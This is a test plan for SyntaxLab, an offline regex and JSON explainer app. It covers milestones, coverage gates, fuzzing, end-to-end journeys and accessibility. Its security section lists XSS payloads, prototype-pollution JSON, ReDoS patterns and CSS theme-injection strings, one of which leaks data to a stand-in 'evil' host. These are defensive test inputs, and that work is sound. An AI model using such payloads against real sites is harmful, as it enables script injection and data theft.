# 13 — Test Plan

**Project:** SyntaxLab
**Status:** Draft for human review
**Last updated:** 2026-08-17

---

> **Scope note (Phase 1.5).** **§§1–9 and §§11–13 are V1.0** (regex + JSON). **§10 is V1.1** (cron). Share-URL tests are removed from V1.0 with the feature. Each test group names the milestone that introduces it, so the plan cannot drift from the implementation.

## 1. Strategy

The test pyramid is deliberately bottom-heavy, because the risk in this application is concentrated in pure logic (parsers, explanation, schedule computation) that is cheap to test exhaustively.

```
         ╱╲          E2E (~25)          user journeys, offline, PWA
        ╱  ╲         Integration (~60)  editor→parser→explanation, storage
       ╱    ╲        Component (~80)    rendering, interaction, a11y
      ╱______╲       Unit (~400)        parsers, explainers, validators
     ╱________╲      Property/fuzz      generative — the highest-value layer here
```

The **property/fuzz layer sits outside the pyramid** because it is not a size tier — it is a different kind of assurance. For a tool whose entire job is parsing hostile input, generative testing finds the bugs that example-based tests never will.

### Tests are introduced with their milestone

A test plan that is not tied to milestones becomes a wish-list written at the end. Each group below is introduced by the milestone that creates the code it covers:

| Milestone | Tests introduced |
|---|---|
| M1 | Store primitive; smoke render; lint/typecheck gates; **first bundle measurement** |
| M2 | Worker round trip, timeout → terminate → respawn, superseded responses, malformed payload rejection, `structuredClone` round trip |
| M3 | Regex tokenizer/parser/explainer units; regex golden corpus; regex property + differential |
| M4 | Regex component tests; I1–I4; E2; E12; axe on the regex view; render-count assertion |
| M5 | JSON scanner/parser units; JSONTestSuite conformance; JSON property + differential; prototype-pollution corpus |
| M6 | JSON component tests; I5–I7; E3; axe on the JSON view; virtualisation performance |
| M7 | Repository units; I10–I17, I22; storage security; E5; E10 |
| M8 | Theme validation units; theme-injection corpus; E6; no-flash assertion |
| M9 | E7, E8, E9; offline analysis for both modes; precache budget |
| M10 | Full security suite; full axe sweep; screen-reader pass; E17, E18 |
| M11 | Bundle budgets; Lighthouse gates; long-task audit; memory snapshots |
| M12 | Full E2E suite; cross-browser; manual checklist |
| **M14–M16 (V1.1)** | Cron units, golden corpus, refusal tests, DST matrix, property; I8, I9; E4 |

### Implemented at M1

| Suite | Count | Status |
|---|---|---|
| Unit (`vitest`) | **47** across 6 files | ✅ passing |
| E2E (`playwright`, production build) | **7** | ✅ passing |
| Accessibility (`axe-core`, in E2E) | 1 gate, all views at M1 | ✅ 0 critical/serious |

M1 unit coverage: the store primitive (reference-equality short-circuit,
unsubscribe-during-notify, isolation), `Result`/`DomainError` construction and
hostile-input truncation, `LIMITS` values and the debounce/manual-analysis
boundaries, `ModeSelector` radiogroup semantics and keyboard navigation, the
shell's landmark and live-region structure, and error-boundary recovery.

M1 E2E coverage: shell renders without a page error, product identity is
present, keyboard-only mode switching, **zero CSP violations**, **zero network
requests after load**, **zero critical/serious axe violations**, and no
horizontal scroll at a 360 px viewport.

**One real defect was found by these tests and fixed:** `--gray-400` failed
WCAG AA contrast (4.19:1 on surfaces against a 4.5:1 requirement). The
documented value had been calculated by hand and was wrong. See
`09_DESIGN_SYSTEM.md` §3.4.

### Implemented at M2

| Suite | Count | Status |
|---|---|---|
| Unit — protocol validation | 38 | ✅ passing |
| Unit — WorkerClient lifecycle | 22 | ✅ passing |
| E2E — real workers, **3 engines** | 10 × 3 = 30 | ✅ passing |
| **Total after M2** | **107 unit, 38 E2E** | ✅ |

Cross-browser matrix for the R-10 checkpoint:

| Behaviour | Chromium | Firefox | WebKit |
|---|---|---|---|
| Worker startup and round trip | ✅ | ✅ | ✅ |
| Concurrent requests, no crossed responses | ✅ | ✅ | ✅ |
| Work completes inside the deadline | ✅ | ✅ | ✅ |
| **Busy loop terminated at the deadline** | ✅ | ✅ | ✅ |
| **Replacement worker serves the next request** | ✅ | ✅ | ✅ |
| Settles at the deadline, not after the task | ✅ | ✅ | ✅ |
| Survives three consecutive timeouts | ✅ | ✅ | ✅ |
| **Analysis worker survives an execution timeout** | ✅ | ✅ | ✅ |
| **Main thread interactive while the worker is pinned** | ✅ | ✅ | ✅ |
| Capability detection reports availability | ✅ | ✅ | ✅ |

The unit suite uses a controllable Worker double: real workers cannot be
driven deterministically from a unit test, since timing is at the mercy of the
thread scheduler. Real workers are covered by the E2E matrix above.

### Implemented at M3

| Suite | Count | Status |
|---|---|---|
| Unit — tokenizer | 77 | ✅ |
| Unit — parser | 62 | ✅ |
| Unit — golden corpus | 170 | ✅ |
| Unit — edge cases | 61 | ✅ |
| Unit — differential vs `new RegExp` | 206 | ✅ |
| Property / fuzz | 19 properties | ✅ |
| Unit — protocol + client validation | +27 | ✅ |
| E2E — regex through the worker, ×3 engines | 15 | ✅ |
| **Total after M3** | **715 unit, 53 E2E** | ✅ |

**Golden corpus: 164 distinct human-reviewed patterns**, organised by grammar
area — literals, escapes, anchors, dot, character classes (including class
identity escapes), quantifiers, quantified groups, alternation, groups,
nesting, lookaround in context, backreferences, Unicode properties, flags,
astral characters, and realistic patterns. Plus malformed, foreign-dialect,
and warning cases asserted separately.

**Coverage of `src/domain/regex`: 97.70% statements, 90.85% branch** — above
the documented ≥95% gate.

**Defects found by these tests during M3** (all fixed, all pinned as
regressions):

| Found by | Defect |
|---|---|
| Differential | `\k<name>` rejected where the engine accepts it (Annex B) |
| Differential | `[a\-z]` rejected under `/u` |
| Differential | `\01` accepted under `/u` |
| Property (span containment) | empty group body anchored outside its parent |
| Parser unit test | groups reported in completion order, not source order |
| Golden review | `[\]]` read as "the escape", not as a literal |
| Golden review | multi-part lookaround body not bracketed, so its extent was ambiguous |
| Lint (exhaustiveness) | `analysis.regex` case missing from the worker dispatch |

### Implemented at M4

| Suite | Count | Status |
|---|---|---|
| Unit — regex execution semantics | 44 | ✅ |
| Unit — view models | 24 | ✅ |
| Unit — application orchestration | 20 | ✅ |
| Unit — exec protocol and result validation | 13 | ✅ |
| Unit — components, by role and accessible name | 25 | ✅ |
| Unit — golden corpus | 188 | ✅ |
| **Total after M4** | **859 unit, 146 E2E (3 skipped)** | ✅ |

**E2E: 24 tests × 4 targets** — Chromium, Firefox, WebKit and a mobile
viewport — against the **production** build, so the CSP and the real chunking
are in force. Covers the whole journey, flags, invalid patterns, foreign
dialects, timeout and recovery, XSS payloads, paste limits, keyboard
navigation, 360 px layout and axe.

**Three tests are skipped on WebKit**, with a measurement as the reason rather
than a shrug: JavaScriptCore bounds its own backtracking, so no pattern reaches
the deadline there (`04_PARSER_ARCHITECTURE.md` §2.9). Termination on WebKit is
proven at M2 against a busy loop, which is the stronger condition.

**Defects found by these tests during M4** (all fixed):

| Found by | Defect |
|---|---|
| axe (E2E) | A collapsible `<Panel>` rendered its title as a bare button, dropping the section from the document outline |
| axe (E2E) | Hint text inside a warning row measured 3.88:1 on the amber tint — below AA. It used the muted token, which is only measured against the panel surface. |
| Protocol unit test | `parseWorkerRequest` rebuilt the envelope field by field but passed the payload through by reference, so unknown wire keys did reach the worker |
| Component unit test | The explanation carried no positioned reference nodes, so the documented explanation-to-source link had nothing to attach to and `spanRef` was dead code |
| **Human review** | Four wording defects — see §below |

**The human review is the part a test suite cannot do.** Forty-five patterns
across every grammar area were read as a user would read them, and found four
defects that every existing test passed: escapes restating their own syntax
(`\x41` → "the character \x41"), a multi-member character class running into
the surrounding prose with no boundary, "any of a literal ]" as a sentence, and
`.` and `-` described two different ways in the same class. Fifteen fixtures
now pin the corrected wordings, each naming the defect it guards against.

### Implemented at M5

| Suite | Count | Status |
|---|---|---|
| Unit — JSON parser structure and errors | 59 | ✅ |
| Unit — differential vs `JSON.parse` | 166 | ✅ |
| Unit — golden corpus, human-reviewed | 68 | ✅ |
| Unit — prototype pollution and hostile content | 51 | ✅ |
| Unit — worker protocol, paths and numbers | 32 | ✅ |
| Property / fuzz | 17 properties | ✅ |
| E2E — JSON through the real worker, ×3 engines | 7 | ✅ |
| **Total after M5** | **1 252 unit, 167 E2E (3 skipped)** | ✅ |

**Coverage of `src/domain/json`: 97.5% statements, 91.0% branch** — above the
documented ≥95% gate.

**The differential suite states what it proves.** Validity and values against
`JSON.parse`, across a curated corpus and 4 000 generated and mutated
documents. It is explicitly silent on positions (the oracle has none), on
duplicate keys (we differ by design), and on diagnostic quality (we report
more, and more specifically, on purpose). Those are covered by unit and
property tests instead.

**Defects found by these tests during M5** (all fixed):

| Found by | Defect |
|---|---|
| Golden corpus | The scanner and the parser both reported `{a:1}`, so one mistake produced two errors |
| Coverage | `isValidJsonAnalysis` had no tests at all — 3% covered, on the module that stands between a malformed worker result and application state |
| Coverage | `EMPTY_STATS` was exported and imported by nothing |
| **Human review** | Eight wording defects — see below |

**The human review is the part a test suite cannot do.** Thirty documents
across every category were read as a user would read them. Eight defects, each
of which every existing test passed:

| Defect | Fix |
|---|---|
| The Structure section restated the summary verbatim | It now carries what the summary cannot: counts, depth, keys, size |
| "0 levels deep" for a bare scalar | Depth omitted where there is no nesting |
| The array breakdown repeated a homogeneous summary | Shown only for mixed arrays |
| `$` appeared raw in findings | "at the top level" where the path is empty |
| "keep them as strings" followed a negative zero and an overflow | Advice only where it applies |
| "the rest was read as a part that could not be read" | No recovery is claimed unless something substantive survived |
| ", and" joining a two-clause summary | Written out; `joinClauses` is right for three |
| "a single string, hello" | A colon reads better before a quoted value |

### Implemented at M6

| Suite | Count | Status |
|---|---|---|
| **JSONTestSuite conformance** | **644** | ✅ **J-2 passed** |
| Unit — JSON UI view models | 51 | ✅ |
| E2E — JSON workspace, ×4 targets | 32 | ✅ |
| **Total after M6** | **1 947 unit, 298 E2E (3 skipped)** | ✅ |

**J-2 is closed with evidence.** The published corpus is vendored under
`tests/fixtures/jsontestsuite/` with its MIT licence: 95/95 `y_` accepted,
188/188 `n_` rejected, 35 `i_` classified in the test as data. Every one of the
318 verdicts matches `JSON.parse` on the same decoded text.

**The corpus is checksummed, after a real incident.** A `prettier --write` run
over the repository reformatted the fixtures as ordinary JSON and *repaired*
twelve of them — `[2.e3]` became `[2e3]`, `["",]` became `[""]` — and the file
count was unchanged, so the count assertion passed while the suite had been
silently weakened. A SHA-256 manifest now guards the contents, and
`.prettierignore` excludes the directory. The manifest is the gate; the ignore
rule is the convention.

**Defects found by M6 testing** (all fixed):

| Found by | Defect |
|---|---|
| E2E | The auto-select rule keyed off the *target* editor being empty, so a mode could switch while the user was mid-edit |
| Unit | `\bword\b` detected as "unknown" — a shorthand escape is near-conclusive evidence of a pattern |
| Conformance | The corpus had been corrupted by a formatter (above) |
| **Manual review** | Three wording and marking defects — see below |

**The manual pass** read seventeen documents as a user would: small, deep,
mixed, long strings, Unicode, duplicate keys, precision loss, negative zero,
overflow, malformed, partial recovery, prototype-pollution and XSS payloads.

| Defect | Fix |
|---|---|
| The status line read "1 keys" and "1 values" | Singularised |
| Two duplicate occurrences on one line both read "line 1" | Line **and column**, so the jump targets differ |
| A node from error recovery was marked only by colour | It carries the words "could not be read" |

### Tooling

| Layer | Tool | Why |
|---|---|---|
| Unit / integration | **Vitest** | Native Vite integration, no separate build config, fast watch |
| Component | **React Testing Library** | Role-based queries; encourages accessible markup |
| Property / fuzz | **fast-check** | Mature, shrinking works, integrates with Vitest |
| E2E | **Playwright** | Real Chromium/Firefox/WebKit, offline emulation, service-worker support |
| Accessibility | **axe-core** via `@axe-core/playwright` and `jest-axe` | |
| Performance | **Lighthouse CI** + Playwright PerformanceObserver | |
| Coverage | **v8** via Vitest | |

---

## 2. Coverage targets

| Area | Line | Branch | Rationale |
|---|---|---|---|
| `domain/` | **95%** | **90%** | Pure logic, no excuse for gaps, highest risk |
| `application/` | 90% | 85% | Use-case orchestration |
| `infrastructure/` | 85% | 75% | Some browser paths need E2E instead |
| `features/`, `components/` | 75% | 65% | Diminishing returns on presentational code |
| **Overall** | **85%** | **80%** | CI gate |

Coverage is a floor, not a goal. A 95%-covered parser with no fuzz testing is less trustworthy than an 80%-covered one backed by differential testing.

**What the suite establishes, stated honestly.** We do not claim to test "all edge cases" — the input space is unbounded and the claim would be unfalsifiable. The suite produces *evidence*:

| Claim | Evidence |
|---|---|
| Agrees with the platform on validity | Differential testing across the fuzz corpus, with the corpus size reported in CI |
| Handles the published JSON conformance suite | JSONTestSuite results, reported per category |
| Terminates on every corpus input | Step-budget property assertion |
| Produces the reviewed explanation for these cases | Golden fixtures, human-reviewed on change |
| Handles these specific hostile inputs | Named security corpus |
| **Refuses unsupported input clearly** | Refusal tests — see §13.1 |

---

## 3. Unit tests

### 3.1 Regex domain (~150 cases)

**Tokenizer:** every token kind; escapes (`\d \w \s \b \n \x41 A \u{1F600} \cA \0`); char classes including ranges, negation, and nested `-`; all quantifier forms; all group forms; Annex B vs `/u` divergences; unterminated constructs.

**Parser:** precedence (`a|bc` vs `(a|b)c`); nesting depth; group numbering including nested and alternation cases; named groups and duplicates; forward and backward backreferences; error recovery for each recoverable error; the depth limit.

**Explainer:** every AST node type; context sensitivity (`.` at top level / with `s` / in a class; `^` as anchor / negation; `-` as range / literal); flag effects; the golden corpus.

**Golden corpus** — 150+ real patterns with reviewed explanation output:
```
^[A-Z][a-z]+$
^\d{3}-\d{2}-\d{4}$
(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})
^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$
\b(?:https?|ftp)://[^\s/$.?#].[^\s]*\b
(?<=\$)\d+(?:\.\d{2})?
^(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*)@…
(a+)+$                          ← ReDoS shape, must warn
\p{Script=Greek}+               ← requires /u
[\p{L}\p{N}]+                   ← unicode property class
```

### 3.2 JSON domain (~120 cases)

**Scanner:** all escapes; surrogate pairs; lone surrogates preserved; rejected control characters; every number form valid and invalid; deep nesting; empty containers; whitespace variants including the four legal whitespace characters and no others.

**Parser:** the RFC 8259 conformance suite (the JSONTestSuite corpus — `y_*` must accept, `n_*` must reject, `i_*` documented either way); error recovery; multiple errors; the depth limit; the node limit; duplicate keys; unsafe numbers; key-order preservation with integer-like keys.

**Differential:** for every generated and corpus input, our validity verdict must equal `JSON.parse`'s. Any disagreement is our bug. This single test is worth more than the rest of the JSON suite combined.

**Formatting:** prettify at 2/4/tab; minify; round-trip idempotence; raw number text preserved (`1e5` stays `1e5`); formatting a partially-invalid document does not throw.

### 3.3 Cron domain — **V1.1, ~120 cases**

> Introduced at M14. Not part of the V1.0 suite.

**Field parsing:** every field's range boundaries; names (`JAN`, `mon`, mixed case); lists, ranges, steps, and combinations; `0` and `7` for Sunday; invalid values; inverted ranges; zero/negative steps.

**Refusal tests — as important as the parsing tests.** Unsupported input must be refused clearly, and that behaviour is specified, so it is tested:

| Input | Expected |
|---|---|
| `0 0 12 * * ?` (6 fields) | Refusal naming the 5-field format; **no parse attempted**; mentions seconds-first and year conventions |
| `0 0 12 * * ? 2026` (7 fields) | Refusal |
| `0 0 L * *` | Refusal naming Quartz |
| `0 0 15W * *` | Refusal naming Quartz |
| `0 0 * * 5#3` | Refusal naming Quartz |
| `H 0 * * *` | Refusal naming Jenkins |
| `0 0 * *` (4 fields) | "Expected 5 fields, got 4" |
| `rate(5 minutes)` | Refusal naming AWS EventBridge |

Assertion for every row: the message is specific, no schedule is produced, and **no next-run time is displayed**.

**Schedule computation:** next run for every preset; month and year rollover; leap years across 4/100/400 boundaries; the DOM/DOW OR-rule with an explicit truth table; unsatisfiable schedules terminating with the correct message; the 5-year search bound.

**Timezone — reduced scope (browser-local and UTC only):** UTC has no transitions and is the control case; browser-local is tested with the test runner's TZ pinned to a set of zones, exercising spring-forward skip, fall-back repeat, a southern-hemisphere zone, a half-hour-offset zone (`Asia/Kolkata`), and a no-DST zone. **Named-zone selection is not implemented, so it is not tested** — instead there is a test that no named-zone UI exists.

**Golden corpus** — 100+ expressions with reviewed English output.

### 3.4 Shared and infrastructure

Detection (each type, ambiguous cases, empty, confidence thresholds); limits enforced at all three layers; `Result` helpers; theme validation (valid hex, invalid hex, injection strings, out-of-range numbers, unknown keys); history repository CRUD, query, dedupe, prune, quota, corruption; migrations from every prior fixture; import/export round-trip. **(Share codec tests are removed with the deferred feature.)**

---

## 4. Property and fuzz tests

The highest-value layer. Target: **100 000 generated cases per parser per CI run**, with a fixed seed for reproducibility plus a rotating seed for discovery.

### 4.1 Universal parser properties

```ts
// Never throws
fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
  expect(() => parseRegex(s)).not.toThrow();
}));

// Always terminates within a step budget
fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
  const { steps } = parseRegexInstrumented(s);
  expect(steps).toBeLessThan(s.length * 100);
}));

// Spans are well-formed and properly nested
fc.assert(fc.property(fc.string(), (s) => {
  const r = parseRegex(s);
  if (r.ok) expectValidSpans(r.value.ast, s.length);
}));

// Differential: we agree with the platform on validity
fc.assert(fc.property(fc.string({ maxLength: 500 }), (s) => {
  let native = true; try { new RegExp(s, 'u'); } catch { native = false; }
  expect(parseRegex(s, { unicode: true }).ok).toBe(native);
}));
```

### 4.2 Structured generators

Random strings mostly produce invalid input, which tests only the error paths. Structured generators produce *valid but unusual* input, which is where correctness bugs hide:

- **Regex:** a recursive arbitrary building valid patterns from the grammar — nested groups, alternations, quantifiers, classes, backreferences
- **JSON:** `fc.jsonValue()` plus a serialiser producing unusual-but-valid formatting (odd whitespace, deep nesting, extreme numbers, escape-heavy strings)
- **Cron *(V1.1)*:** valid field values composed into 5-field expressions, plus generated 6- and 7-field expressions asserted to be **refused**, never parsed

### 4.3 Round-trip properties

```
JSON:  parse → format → parse  ⇒ structurally identical
JSON:  parse → minify → parse  ⇒ structurally identical
Export:export → import         ⇒ identical entries
Cron:  parse → toString → parse⇒ identical schedule   (V1.1)
```

### 4.4 Failure handling

Every counterexample fast-check finds becomes a **permanent named unit test**. The fuzzer finds it once; the regression suite keeps it found.

---

## 5. Integration tests

| # | Flow | Assertions |
|---|---|---|
| I1 | Type regex → analysis appears | Debounce respected; worker called once; explanation rendered |
| I2 | Type invalid regex → error | Error position accurate; editor marker present; no crash |
| I3 | Regex + test string → matches | Highlights at correct offsets; group values correct |
| I4 | Catastrophic regex → timeout | Timeout state within ~2 s; UI responsive throughout; worker respawned; the next test works |
| I5 | Paste JSON → tree | Tree structure matches; paths correct; stats correct |
| I6 | Invalid JSON → error report | Line/column exact; jump-to-position works |
| I7 | Format → minify → format | Content preserved |
| I8 | *(V1.1)* Cron → next runs | Times correct in the selected mode; **zone label on every row**; 6-field input refused |
| I9 | *(V1.1)* Switch browser-local ↔ UTC | Next runs recompute; labels update |
| I10 | Analysis → history | Entry created with correct title and metadata |
| I11 | History → restore | Input restored exactly; analysis recomputes; `lastOpenedAt` updated |
| I12 | Pause history → analyse | Nothing written |
| I13 | Theme change → reload | Persisted and applied pre-paint |
| I14 | Export → clear → import | Entries restored identically |
| I15 | Quota exceeded | Prune, retry, notify, disable auto-capture |
| I16 | Storage unavailable | Memory mode; app fully functional; notice shown |
| I17 | Corrupted records | Quarantined; list still renders |
| I18 | Worker fails to start | Fallback mode; regex execution disabled with an explanation |
| I19 | First-run history notice | Appears once, before any save; "Turn history off" disables capture immediately; does not reappear |
| I20 | Mode switch | Input preserved per mode; correct chunk loaded |
| I21 | Detection | Suggestion appears; override works; dismissal sticks |
| I22 | Two tabs | History change propagates via BroadcastChannel |

---

## 6. End-to-end tests

Playwright, against a production build, on Chromium (all), Firefox and WebKit (critical path only).

| # | Journey |
|---|---|
| E1 | Open app → empty state → click a regex example → explanation appears |
| E2 | Full regex journey: type, flags, test string, matches, copy |
| E3 | Full JSON journey: paste, tree, expand, copy path, format |
| E4 | *(V1.1)* Full cron journey: preset, timezone switch, next runs, builder, 6-field refusal |
| E5 | Analyse → open history → restore → verify |
| E6 | Customise theme → reload → theme persists, **no flash** |
| E7 | **Offline:** load, go offline, reload, both analyses work (three from V1.1) |
| E8 | **PWA:** SW registers, precache populated, manifest valid |
| E9 | Update flow: new SW → banner → no auto-reload → accept → content preserved |
| E10 | Export → clear → import → verify |
| E11 | Keyboard-only: complete a full analysis without a mouse |
| E12 | ReDoS: paste catastrophic pattern → timeout state → UI responsive during |
| E13 | Oversized input → clean rejection |
| E14 | Clipboard sharing: copy input, copy explanation, copy JSON path; assert `text/plain` only |
| E15 | Mobile viewport: tabs work, drawers full-screen, no horizontal scroll |
| E16 | 200% zoom: no horizontal scroll, everything reachable |
| E17 | **Network silence:** intercept all requests; assert zero after load |
| E18 | CSP: assert header; fail on any violation event |
| E19 | Error boundary: force a panel crash; assert other panels survive and input is preserved |
| E20 | Reduced motion: assert transitions disabled |

E7, E12, and E17 are the three tests that verify the product's headline claims. If any of them fails, the release does not ship regardless of everything else.

---

## 7. Security tests

Every payload in `tests/security/payloads/` is driven through **every V1.0 input surface**: regex pattern, test subject, JSON body, JSON key, history title, and imported file. Cron fields are added at M14. **Share URLs are not a surface in V1.0.**

### 7.1 XSS

```
<script>window.__xss=1</script>
<img src=x onerror="window.__xss=1">
<svg/onload="window.__xss=1">
javascript:window.__xss=1
"><script>window.__xss=1</script>
<iframe src="javascript:window.__xss=1">
{{constructor.constructor('window.__xss=1')()}}
<style>@import 'http://evil'</style>
<a href="data:text/html,<script>window.__xss=1</script>">
<script>window.__xss=1</script>
<div id="x"></div><script>…</script>   ← mXSS-style broken markup
```

Assertions after each: `window.__xss` is `undefined`; the payload is present as visible **text**; no `<script>` element was created; no CSP violation fired.

### 7.2 Prototype pollution

```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
{"__proto__": {"toString": "boom"}}
{"a": {"__proto__": {"polluted": true}}}
[{"__proto__": {"polluted": true}}]
```
Through: JSON parse, import, preference load. Assert `({}).polluted === undefined` and `Object.prototype.polluted === undefined` after each.

### 7.3 ReDoS
```
(a+)+$                      with "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
(a|a)*$                     with the same
([a-zA-Z]+)*$
(a|b|ab)*c                  with 30 chars
^(([a-z])+.)+[A-Z]([a-z])+$
nested {1,1000} repetitions
```
Assert: timeout state within ~2.5 s; the main thread stayed responsive (a click during execution is handled); the worker was terminated and respawned; the next execution succeeds.

### 7.4 Oversized and pathological input
Regex at 10 001 chars; test subject at 1 MB + 1; JSON at 5 MB + 1; JSON nested 501 deep; JSON with 500 001 nodes; a 1 MB single JSON string; a 20 MB + 1 import file. *(A 1 001-char cron expression is added at M14.)* Assert: clean rejection with a specific message; no crash; no hang.

### 7.5 Storage tampering
Pre-seed IndexedDB with: a record missing required fields; wrong types; `schemaVersion: 99`; a 10 MB input string; a prototype-polluting record; an XSS payload in `title`. Assert: quarantine or safe render; list still works; no crash; no execution.

### 7.6 Theme injection
```
--gradient-from: red; background: url(https://evil/?leak=
#00ff88; } body { display: none } .x {
expression(alert(1))
url(javascript:alert(1))
```
Assert: rejected by the hex allowlist; defaults applied; no CSS rule created.

### 7.7 Malicious import
Wrong MIME and extension; a valid JSON file that is not an export; version 999; 100 000 entries; a deeply nested envelope; a prototype-polluting envelope. Assert: specific rejection message; no partial import; no hang.

---

## 8. Accessibility tests

### Automated
`axe-core` on every primary view and every drawer/dialog, in both contrast modes, at 100% and 200% zoom. **Gate: zero critical or serious violations.** Plus keyboard-only navigation of every flow via Playwright, and a focus-order snapshot test.

### Manual, before release
| Check | Method |
|---|---|
| Screen reader — full flow | NVDA + Firefox; VoiceOver + Safari |
| Announcement quality | Results announce a useful summary, not token soup; not spammy while typing |
| Focus management | Drawers/dialogs trap and restore correctly |
| Editor accessibility | CM6 usable with a screen reader; escape route from the tab trap documented and working |
| Colour independence | Greyscale screenshot review — all status still legible |
| Colour-vision deficiency | Deuteranopia/protanopia/tritanopia simulation of the syntax palette |
| Contrast | Automated check of every default pair, plus the live checker for custom themes |
| Zoom / reflow | 200% and 400%, 320 px width |
| Reduced motion | OS setting honoured |

---

## 9. Performance tests

Per `12_PERFORMANCE.md` §8. In CI: bundle budgets, Lighthouse gates, long-task detection, parser microbenchmarks with a 20% regression gate, and the render-count assertion on the typing path.

---

## 10. Compatibility matrix

| Browser | Support | Tested |
|---|---|---|
| Chrome/Edge (last 2) | Full | Automated + manual |
| Firefox (last 2) | Full | Automated + manual |
| Safari 16.4+ | Full | Automated (WebKit) + manual |
| Safari 15–16.3 | Degraded: no regex lookbehind in the *engine* — reported as a compatibility note on affected patterns | Manual |
| Chrome Android | Full | Manual |
| Safari iOS 16.4+ | Full; storage eviction caveat | Manual |
| IE / legacy Edge | Unsupported | — |

Feature detection with graceful degradation for: `CompressionStream`, `Intl.supportedValuesOf`, `navigator.storage.persist`, `BroadcastChannel`, `crypto.randomUUID` (a small UUID v4 fallback using `crypto.getRandomValues`), `structuredClone`, `color-mix()`.

---

## 11. CI pipeline

```yaml
on: [push, pull_request]
jobs:
  quality:      # typecheck · eslint · stylelint · prettier --check
  unit:         # vitest run --coverage  (gate: 85% / 80%)
  property:     # fast-check, 100k cases, fixed + rotating seed
  security:     # security suite + npm audit --audit-level=high
  build:        # production build + bundle budget check
  e2e:          # playwright (chromium full, firefox/webkit critical)
  a11y:         # axe on all views  (gate: 0 critical/serious)
  lighthouse:   # gates: 95/95/95/90 + PWA
```

**All jobs must pass to merge.** No exceptions, no "fix it in the next PR".

---

## 12. Manual test checklist (pre-release)

```
[ ] Fresh install, no cached data — first-run experience is coherent
[ ] Every shipped mode with real-world inputs
[ ] Offline after first load — every feature
[ ] Install as a PWA on desktop and Android; launch standalone
[ ] Update flow in an installed PWA
[ ] Screen-reader pass on the primary journey
[ ] Keyboard-only pass
[ ] 200% zoom
[ ] Mobile device, real hardware
[ ] Theme customisation including a deliberately terrible colour choice
[ ] History with 500 entries — performance and pruning
[ ] Import a hostile file by hand
[ ] Devtools: inspect everything written to storage; confirm no surprises
[ ] Network tab: confirm zero requests after load
[ ] Security header review on the deployed preview
```

---

## 13. What testing will not catch

Stated so nobody mistakes a green pipeline for correctness:

- **Explanation quality.** Tests assert the explanation *matches the golden file*. Whether it is *good* is a human judgement, reviewed on every golden-file change.
- **Design and feel.** No test knows the UI looks cheap.
- **Cron semantics vs a specific scheduler** *(V1.1)*. We test our documented dialect, not parity with any particular implementation — and we say so in the UI.
- **Novel browser bugs.** Especially in service workers and IndexedDB.
- **Supply-chain compromise.** `npm audit` finds known issues, not new ones.
- **Whether the product is useful.** That needs users.

---

## 13.1 Refusal is specified behaviour, and is tested as such

Where SyntaxLab deliberately does not support something, the correct behaviour is a **clear refusal with a useful message** — not a best-effort attempt. That is a feature with acceptance criteria, so it has tests:

| Deliberate non-support | Refusal test | Criterion |
|---|---|---|
| Non-ECMAScript regex constructs | Each row of the dialect table produces its specific corrective hint | R-18, R-19 |
| Non-5-field cron *(V1.1)* | Each unsupported dialect produces a message naming the scheduler it comes from | C-7 to C-11 |
| JSON5 / JSONC syntax | Trailing commas, comments, single quotes each produce a dialect-aware hint | J-20 |
| Named timezones *(V1.1)* | No named-zone UI exists; the standing scope note is present | C-6, C-23 |
| Oversized input | Rejected before parsing, with the actual size shown | S-7 |

A refusal that is vague ("invalid input") fails these tests just as surely as a wrong parse would.


---

## 14. M7 — history

### What runs where, and why

happy-dom provides no IndexedDB. Rather than add a fake-IDB dependency, the
split is:

| Layer | Where | What it proves |
|---|---|---|
| Domain — validate, query, title, transfer | Unit | Every rule about what a record may be |
| Repository — dedupe, pruning, quota, degradation | Unit, against a **controllable backend** | The *policy*, including every failure a real database can produce on demand |
| IndexedDB wiring | **E2E, real browsers** | That the policy is actually reaching disk |
| Presentation | Unit, pure functions | The wording |

The controllable backend (`tests/unit/history/fakeBackend.ts`) can be told to
throw a `QuotaExceededError` once, or on every write. That is the only
practical way to test "storage filled up" — you cannot reliably fill a real
browser's quota in a test, and a test that tried would be slow and flaky.

**Both backends share one implementation of the rules.** The memory fallback is
the same `HistoryStore` over a different backend, so the path that gets the
least manual testing behaves identically to the one that gets the most.

### The E2E suite — 22 tests × 3 browsers

Real IndexedDB, production build, real CSP. Beyond the happy path:

| Test | What would otherwise go unnoticed |
|---|---|
| Survives a reload | That this is storage, not session state |
| A stored `<img src=x onerror=...>` renders as text | That nothing in the round trip through disk builds markup |
| A corrupt record planted directly in the database | That one bad record does not take the list down, and is set aside rather than deleted |
| A record with `schemaVersion: 99` and `type: 'cron'` | That an old build does not destroy a newer build's data — the record is read back **off disk** to prove it survived |
| `indexedDB` removed before any app code runs | That regex and JSON still work, and that the UI says history is not being saved |
| Two tabs | That a save in one reaches the other, and pausing in one pauses the other |
| Focus after 12 Tab presses | That the modal actually traps focus |

### Defects the tests found

| Found by | Defect |
|---|---|
| Unit | `schemaVersion: 1.5` was classified as data from a newer build — kept and hidden — when it is corruption. The future check now requires an integer. |
| E2E | The history button's accessible name collided with the pause toggle's. The pause label now leads with its verb. |
| E2E | An entry row's accessible name was the entire row read as one sentence. Rows now carry explicit labels. |
| **Reading the spec against the build** | Four drifts: a missing compound index, a `meta` record shaped for its caller rather than the store, an explicit Analyze that still waited two seconds, and quota exhaustion that retried a failing write after every analysis for the rest of the session. |

### The M6 flake, closed

The unreproduced `workers-firefox` failure recorded at M6 was investigated at
M7 before any other work: five consecutive full-suite runs under full parallel
load. It never recurred. Three other single failures appeared across those
runs, no two the same test, spread over four browser projects — including one
test that failed on two different engines.

**Judged an environment flake, and no retry or timeout increase was added.**
Every affected test has a wall-clock dependency and eleven browser projects
share one machine. Adding retries would hide the signal: if these ever
concentrate on one test, that is a real defect and it should stay visible.

One of the three recurred during the final M7 run. It was checked against M7
specifically — the milestone adds a banner directly above the element that
test looks at — and ruled out: the same test failed on a build that contained
no history code, and three isolated repeats pass with the banner present.

Full evidence in `IMPLEMENTATION_STATUS.md`, M7.

### What is deliberately not tested

